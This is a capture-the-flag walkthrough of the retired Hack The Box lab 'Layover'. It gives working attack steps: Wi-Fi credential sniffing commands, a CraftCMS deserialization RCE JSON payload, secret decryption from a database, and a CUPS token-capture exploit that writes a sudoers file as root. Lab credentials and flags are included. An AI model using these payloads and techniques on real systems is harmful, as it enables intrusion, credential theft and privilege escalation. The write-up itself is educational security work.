# Hack The Box — Layover

> **OS:** Linux (Ubuntu 24.04) · **Difficulty:** Hard · **Status:** Retired
> **Theme:** Airport / airline ("HTB International" + "HTB Airways") LXD estate
> **Entry point:** `10.129.247.82`

A multi-host **LXD estate** box. The entry point only exposes **SSH** and **RDP (xrdp)**. The RDP drops you onto a contractor *jumpbox* that is wired into an open airport Wi‑Fi. From there the path runs through a sniffed web login, a CraftCMS RCE, a credential buried in the app database, and finally a **custom-built, deliberately vulnerable CUPS** print server for root.

| Flag | Value |
|------|-------|
| user | `56c8960cb5ab0ee6383920ca0a8ca09f` |
| root | `5973df355140e5d4c902908383ea6ea0` |

*(Flags included because the box is retired. Remove them if you prefer.)*

---

## Table of Contents
1. [Attack chain at a glance](#attack-chain-at-a-glance)
2. [Network / estate map](#network--estate-map)
3. [Recon](#1-recon)
4. [Initial access — RDP to the jumpbox (assumed breach)](#2-initial-access--rdp-to-the-jumpbox-assumed-breach)
5. [Wi‑Fi credential sniffing → jenny](#3-wi-fi-credential-sniffing--jenny)
6. [Web — CraftCMS RCE (CVE‑2026‑28695)](#4-web--craftcms-rce-cve-2026-28695)
7. [Loot the database → user (aporter)](#5-loot-the-database--user-aporter)
8. [Privilege escalation — CUPS (CVE‑2026‑34990)](#6-privilege-escalation--cups-cve-2026-34990)
9. [Appendix A — Dead ends & lessons learned](#appendix-a--dead-ends--lessons-learned)
10. [Appendix B — Tools used](#appendix-b--tools-used)
11. [Appendix C — Key takeaways](#appendix-c--key-takeaways)
12. [Credits](#credits)

---

## Attack chain at a glance

```
VPN ──RDP(3389)──► airside-ws01 (contractor, jumpbox, "container root" via sudo)
                        │   connected to OPEN Wi-Fi "HTB International WiFi"
                        ▼
                 sniff open Wi-Fi (monitor mode)
                        │   captures jenny's plaintext HTTP login
                        ▼
        jenny : Fl1ghtDeck2026!  ──►  portal.international.htb (CraftCMS)
                        │   CVE-2026-28695 element-condition gadget
                        ▼
                  RCE as www-data
                        │   read .env + DB → decrypt mailRelayPassword
                        ▼
        aporter : Skyp0rt_Relay!26  ──SSH──►  portal   ⇒  USER FLAG
                        │   custom CUPS 2.4.16 running as root
                        ▼
                 CVE-2026-34990 (CUPS Local-auth token leak)
                        │   write /etc/sudoers.d/aporter-pwn as root
                        ▼
                     sudo -i  ⇒  ROOT FLAG
```

**User and root both live on `portal` (10.13.37.10).** Everything before `portal` is lateral movement to *reach* it.

---

## Network / estate map

The single public IP is a thin front for an internal LXD estate on two networks:

```
                 ┌───────────────────────────── 10.129.247.82 (VPN entry) ─────────────┐
                 │  :22  SSH  → LXD host (rejects everything we find — not the path)     │
                 │  :3389 RDP → NAT ───────────────► airside-ws01 xrdp                   │
                 └───────────────────────────────────────────────────────────────────── ┘

  Wi-Fi net  10.13.37.0/24 ("HTB International WiFi", open)        LXD bridge 10.159.143.0/24 (".lxd")
  ─────────────────────────────────────────────────            ─────────────────────────────────────
   10.13.37.1    wifi.international.htb  (gateway + captive        10.159.143.1   _gateway.lxd (LXD host)
                 portal :80, also answers as .132)                 10.159.143.45  airside-ws01 eth0
   10.13.37.10   portal.international.htb (CraftCMS)  ◄── USER+ROOT
   10.13.37.182  airside-ws01 wlan (contractor jumpbox)
```

Useful facts discovered along the way:
- `airside-ws01` is an **unprivileged LXC container**. `contractor` has full `sudo` there, but that is only *root inside a mapped user namespace* — no host escape.
- `10.13.37.132` (where jenny's traffic came from) is **not a separate host** — it shares the gateway's MAC (`c2:95:6e:e8:cc:83`) and its `3389` just NATs back to airside. A classic rabbit hole.
- `portal` is where it all matters: it holds the user flag **and** the root flag.

---

## 1. Recon

```bash
nmap -p- --min-rate 3000 -T4 10.129.247.82          # full TCP
nmap -sC -sV -p22,3389 10.129.247.82                # service/scripts
```

```
22/tcp   open  ssh           OpenSSH 9.6p1 Ubuntu 3ubuntu13.19 (Ubuntu 24.04)
3389/tcp open  ms-wbt-server
```

Only **SSH + RDP**. The `3389` is **xrdp** (Linux), and the login banner later reveals the host `airside-ws01` (airport "airside"). SSH on `:22` rejects every credential we ever find — it belongs to the LXD host and is a deliberate decoy for this path.

> **Lesson:** an RDP port on a Linux target almost always means `xrdp`. xrdp has a *session menu* (Xorg/Xvnc/vnc-any/neutrinordp-any) that can be abused to pivot — keep that in mind.

---

## 2. Initial access — RDP to the jumpbox (assumed breach)

Layover is an **assumed-breach** box: you're given a starting credential.

```
contractor : Contractor2026!
```

Connect with FreeRDP:

```bash
xfreerdp /v:10.129.247.82 /u:contractor /p:'Contractor2026!' \
         /cert:ignore /dynamic-resolution +clipboard
```

You land on the **`airside-ws01`** XFCE desktop. Enumerate from a terminal:

```bash
id
#   uid=1001(contractor) ... groups=27(sudo),111(netdev),121(wireshark)
sudo -l
#   (ALL : ALL) ALL          ← full sudo on the jumpbox

ip -4 addr
#   wlan2: 10.13.37.182/24   ← connected to "HTB International WiFi"
#   eth0 : 10.159.143.45/24  ← LXD bridge
```

Two important observations:
- `contractor` is in **`wireshark`/`netdev`** and has **sudo** → we can run packet capture / manage interfaces.
- The box is on an **open Wi‑Fi** alongside other clients. The portal (`portal.international.htb → 10.13.37.10`) is served over **plain HTTP**.

> **Why RDP-only matters:** there is no SSH for `contractor`/`aporter` on the entry (`PasswordAuthentication no` + users not exposed). xrdp is the only interactive way in, so you drive a GUI. In a real engagement you'd use Remmina/mstsc/xfreerdp.

---

## 3. Wi‑Fi credential sniffing → jenny

The portal login is submitted over **HTTP on an open wireless network**, so credentials are in the clear — we just have to capture them.

From the `contractor` desktop (has sudo + a Wi‑Fi radio on channel 6):

```bash
# put the radio in monitor mode on the portal's channel
sudo airmon-ng start wlan2 6          # or: sudo iw dev wlan2 set type monitor

# capture (contractor is in the wireshark group / dumpcap has cap_net_admin)
sudo dumpcap -i wlan2mon -w /tmp/wifi.pcapng
```

While capturing, "jenny" logs into the Miles portal. Pull the credentials straight out of the HTTP POST:

```bash
tshark -r /tmp/wifi.pcapng -Y 'http.request.method == POST' -T fields -e http.file_data
#   username=jenny&password=Fl1ghtDeck2026!     (URL-decoded)
```

```
jenny : Fl1ghtDeck2026!
POST → http://portal.international.htb/miles/login.php
```

> **Lesson:** open Wi‑Fi + cleartext HTTP = credentials on a platter. The only "cracking" here is reading a hex blob. The hard part is realising the box *wants* you to sniff, not brute force.

---

## 4. Web — CraftCMS RCE (CVE‑2026‑28695)

`portal.international.htb` runs **CraftCMS**. With jenny's creds we authenticate to the control panel and trigger the **element-condition gadget** RCE (CVE‑2026‑28695): the `element-search` action deserialises an attacker-controlled *condition* object, and we chain a Yii `AttributeTypecastBehavior` gadget to call `Psy\Readline\Hoa\ConsoleProcessus::execute`.

High-level exploit flow (see [`exploits/craft-rce.sh`](exploits/craft-rce.sh) for the full version):

```bash
B="http://portal.international.htb"

# 1) grab CSRF from the login page, authenticate as jenny (JSON login)
#    POST /index.php?p=admin/actions/users/login  {loginName:jenny, password:...}

# 2) grab a fresh dashboard CSRF, then POST the gadget to element-search:
#    /index.php?p=admin/actions/element-search/search
#
#    The condition contains a fieldLayout whose "as rce" behaviour is the
#    AttributeTypecastBehavior gadget. KEY DETAIL: the "on *" event key must be
#    a SIBLING of "as rce" — not nested inside it — or the gadget never fires.
```

Minimal shape of the malicious payload:

```json
{
  "elementType": "craft\\elements\\Category",
  "condition": {
    "class": "craft\\elements\\conditions\\ElementCondition",
    "elementType": "craft\\elements\\Category",
    "fieldLayouts": [{
      "as rce": {
        "__class": "yii\\behaviors\\AttributeTypecastBehavior",
        "__construct()": [{
          "attributeTypes": {"typecastBeforeSave": ["Psy\\Readline\\Hoa\\ConsoleProcessus","execute"]},
          "typecastBeforeSave": "<YOUR COMMAND>"
        }]
      },
      "on *": "self::beforeSave"
    }]
  },
  "CRAFT_CSRF_TOKEN": "<token>"
}
```

The RCE is **blind**, so for output we used a simple file-read channel: have `www-data` copy a file into the public `cpresources/` directory, then fetch it over HTTP:

```bash
# as www-data (blind):
cp /target/file /var/www/portal/web/cpresources/leak.txt
# then from the attacker:
curl http://portal.international.htb/cpresources/leak.txt
```

Result: **command execution as `www-data`** on `portal`.

> Webroot: `/var/www/portal/web`. Craft stores secrets in `/var/www/portal/.env`.

---

## 5. Loot the database → user (aporter)

`www-data` (and, as it turns out, `aporter`) can read Craft's `.env`:

```bash
cat /var/www/portal/.env
```
```ini
CRAFT_SECURITY_KEY=IGckihiFK64_lrSgJJ6QLkiPz-ow13Lr
CRAFT_DB_DRIVER=mysql
CRAFT_DB_SERVER=127.0.0.1
CRAFT_DB_USER=craftuser
CRAFT_DB_PASSWORD=CraftDB_pw_2026
CRAFT_DB_DATABASE=craft
```

The box ships a custom Craft module, **`htbairways/miles`**, a nightly "Miles statement mailer" that sends via an outbound relay. The relay settings live in a DB table, with the **password stored encrypted with the site security key**:

```bash
mysql -h127.0.0.1 -ucraftuser -pCraftDB_pw_2026 craft \
      -e "select * from htbairways_settings;"
```
```
mailRelayPassword   u0E7OgbBeWhhPn1HajsFMDg0...<base64 blob>...=
mailRelayHost       mail.htbairways.htb
mailRelayUser       aporter
```

The module decrypts it with Yii's `Security::decryptByKey(base64_decode($blob), $securityKey)`. We can do the exact same thing — no app bootstrap needed, just the `yii\base\Security` class from Craft's vendor dir and the security key:

```php
<?php
require "/var/www/portal/vendor/autoload.php";
$s   = new yii\base\Security();
$key = "IGckihiFK64_lrSgJJ6QLkiPz-ow13Lr";
$blob= "u0E7OgbBeWhhPn1HajsFMDg0...=";   // from the DB
echo $s->decryptByKey(base64_decode($blob), $key) . "\n";
```
```
Skyp0rt_Relay!26
```

`mailRelayUser` is **`aporter`**, and the decrypted relay password is reused as `aporter`'s **system** password:

```bash
ssh aporter@10.13.37.10        # Skyp0rt_Relay!26
cat ~/user.txt                 # 56c8960cb5ab0ee6383920ca0a8ca09f
```

✅ **USER**

> **Lesson:** "reversible" app secrets (anything a service can decrypt to use at runtime) are effectively plaintext to anyone who gets the key. The key was sitting in `.env`.

---

## 6. Privilege escalation — CUPS (CVE‑2026‑34990)

`aporter` has **no sudo, no special groups, no interesting SUID/capabilities**, and the common 2025 privescs are **patched** (see Appendix A). The tell is in the service list and the filesystem — the box ships a **deliberately custom-built CUPS 2.4.16 running as root**:

```bash
ps -ef | grep cupsd
#   root  /usr/sbin/cupsd -f               ← print server as ROOT

ss -tlnp | grep 631
#   127.0.0.1:631   (cupsd, localhost only)

cat /etc/systemd/system/cups.service       # custom unit
#   Environment=LD_LIBRARY_PATH=/usr/lib64
#   ExecStart=/usr/sbin/cupsd -f

cat /etc/ld.so.conf.d/cups2416.conf        # /usr/lib64
ls -l /usr/lib64/                          # custom libcups.so.2 (Aug build)
cups-config --version                      # 2.4.16
```

`2.4.16` is not a real upstream CUPS version — it's the box flagging the target. **CUPS ≤ 2.4.16 running as root is vulnerable to CVE‑2026‑34990.**

### Why the "normal" CUPS attack doesn't work here
The usual move — add a printer with a malicious PPD (`FoomaticRIPCommandLine` / `cupsFilter2`) and print to it — requires admin:
```
POST /admin/  CUPS-Add-Modify-Printer   → 401 (no auth)
                                         → 403 as aporter (authenticated, but not in @SYSTEM)
```
`aporter` can authenticate to cupsd (so it's **403**, not 401) but isn't in the `SystemGroup`, so admin IPP ops are refused. There's also **no writable library dir** and **no `foomatic-rip`**. Standard paths are closed.

### CVE‑2026‑34990 — leaking cupsd's own root token
`cupsd`, when it acts as an **IPP client** (e.g. talking to a remote printer), authenticates to peers using a **"Local" auth token** backed by a root certificate under `/run/cups/certs/`. The bug: if a peer challenges it with `401 WWW-Authenticate: Local`, cupsd **volunteers that admin token** — and we can be that peer.

Exploit steps ([`exploits/cve-2026-34990-cups.py`](exploits/cve-2026-34990-cups.py)):

1. Stand up a **rogue IPP server** on `127.0.0.1:9189`.
2. Send `CUPS-Create-Local-Printer` with a `device-uri` pointing at the rogue server → **cupsd connects out to us**.
3. The rogue server replies `401 WWW-Authenticate: Local` → **cupsd replays its root token**; we capture it.
4. Replay that token on `/admin/` to `CUPS-Add-Modify-Printer` a **persistent** queue whose `device-uri` is `file:///etc/sudoers.d/aporter-pwn`.
5. `Print-Job` a gzip'd payload `aporter ALL=(ALL) NOPASSWD: ALL` → **cupsd (root) writes it to the sudoers drop-in**.
6. `sudo -i`.

```bash
python3 exploits/cve-2026-34990-cups.py
```
```
[*] CVE-2026-34990 | user=aporter | cupsd=127.0.0.1:631
[*] coercing cupsd → rogue server ...
[+] captured token: AF2D11F7CA38C299105D550319A69DF9
[*] writing sudoers ...
[+] wrote /etc/sudoers.d/aporter-pwn
[+] ROOT: uid=0(root) gid=0(root) groups=0(root)
```

```bash
sudo -n cat /root/root.txt
#   5973df355140e5d4c902908383ea6ea0
```

✅ **ROOT**

> **Lesson:** a service "requires admin auth" is not the same as "is safe" — if the service can be tricked into **authenticating to you**, it may hand you its own privileges. The `file://` backend + `Print-Job` is then just an *arbitrary file write as root*, and `/etc/sudoers.d/` is the cleanest target.

---

## Appendix A — Dead ends & lessons learned

Documenting what *didn't* work is half the value of a writeup. A lot of time went into these before CUPS clicked:

| Rabbit hole | Reality |
|---|---|
| `sudo -R` **CVE‑2025‑32463** (chroot NSS) | sudo is `1.9.15p5-3ubuntu5.24.04.2` — **patched** (`--chroot` removed). The constructor never fired; confirmed via `dpkg` changelog. |
| **udisks/libblockdev CVE‑2025‑6019** (aporter's SSH session is `loginctl` **active**!) | `libblockdev 3.1.1-1ubuntu0.1` / `udisks2 2.10.1-6ubuntu1.3` — both **patched**. The "active" session was a red herring (default `pam_systemd` behaviour). |
| Pivot to "jenny's workstation" `10.13.37.132` via xrdp `neutrinordp-any` | `neutrinordp` lib isn't shipped; `.132` is really the **Wi‑Fi gateway** (same MAC as `.1`) whose `3389` NATs back to airside. No such host. |
| LXD host `10.129.247.82:22` | Rejects every credential found — not on the intended path. |
| Container escape from airside (`/dev/lxd/sock`, cloud-init) | Unprivileged LXC; `devlxd` config empty; no host secrets. |
| Generic CUPS add-printer / foomatic PPD | Blocked — admin requires `@SYSTEM`; `aporter` isn't a member. |

**Meta-lesson:** check the *installed package version string against the fix version* **before** spending hours on a CVE. `dpkg -l <pkg>` + the Debian changelog (`zcat /usr/share/doc/<pkg>/changelog.Debian.gz`) tells you in seconds whether a CVE is already patched.

---

## Appendix B — Tools used

- **FreeRDP (`xfreerdp`)** — RDP into the xrdp jumpbox.
- **airmon-ng / iw / dumpcap / tshark** — monitor-mode capture + HTTP credential extraction on the open Wi‑Fi.
- **curl + a small bash/python harness** — CraftCMS auth + blind RCE gadget delivery.
- **mysql client + php (`yii\base\Security`)** — read the DB and decrypt the relay secret.
- **nmap / dig / `/dev/tcp`** — internal recon across the two LXD networks.
- **Python 3 (stdlib)** — the CVE‑2026‑34990 CUPS exploit.
- **ssh (`-R` reverse tunnels, dynamic SOCKS) + proxychains** — pivoting from the internal networks back to the attack box for proper scanning.

---

## Appendix C — Key takeaways

1. **An RDP port on Linux = xrdp.** Learn its session-menu pivots and how it holds disconnected sessions.
2. **Open Wi‑Fi + HTTP = free credentials.** Sniff before you brute force.
3. **Reversible app secrets are plaintext.** If the app can decrypt it at runtime and you have the key (`.env`), so can you.
4. **"Needs admin" ≠ "safe".** CVE‑2026‑34990 is a great example of coercing a root service to authenticate *to you*.
5. **Arbitrary file write as root → `/etc/sudoers.d/`** is the most reliable, least destructive escalation primitive.
6. **Version-check CVEs first.** `dpkg` + changelog beats hours of failed exploitation.
7. **In an estate box, user and root are usually still on the same host** — the rest is lateral movement to *get there*.

---

## Credits

- **CVE‑2026‑34990** CUPS PoC adapted from the public PoC by **predyy** (`github.com/predyy/CVE-2026-34990`). Included here under `exploits/` for reproducibility — all credit to the original author.
- Box: **Layover** on [Hack The Box](https://www.hackthebox.com/). Writeup for educational / portfolio purposes; box is retired.

---

### Credentials reference (retired box)

| Where | User | Secret |
|---|---|---|
| RDP jumpbox | `contractor` | `Contractor2026!` |
| Portal web (Craft) | `jenny` | `Fl1ghtDeck2026!` |
| Craft DB | `craftuser` | `CraftDB_pw_2026` |
| Craft security key | — | `IGckihiFK64_lrSgJJ6QLkiPz-ow13Lr` |
| SSH / user | `aporter` | `Skyp0rt_Relay!26` |
